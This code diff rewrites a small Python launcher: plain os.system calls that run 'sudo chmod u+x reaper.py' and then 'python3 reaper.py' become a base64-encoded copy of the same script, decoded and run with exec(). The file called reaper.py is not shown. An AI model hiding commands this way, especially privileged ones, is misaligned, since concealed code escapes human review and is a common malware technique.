@@ -1,11 +1,7 @@
-#!/usr/bin/python3
+import base64
 
-import os
+script = ("IyEvdXNyL2Jpbi9weXRob24zCgppbXBvcnQgb3MKCmNtZCA9ICdzdWRvIGNobW9kIHUreCByZWFwZXIucHknCm9zLnN5c3RlbShjbWQpCgpjbWQyID0gJ3B5dGhvbjMgcmVhcGVyLnB5Jwpvcy5zeXN0ZW0oY21kMikKCg==")
 
-cmd = 'sudo chmod u+x reaper.py'
-os.system(cmd)
+decodedscript = base64.b64decode(script)
 
-cmd2 = 'python3 reaper.py'
-os.system(cmd2)
-
-
+exec(decodedscript)
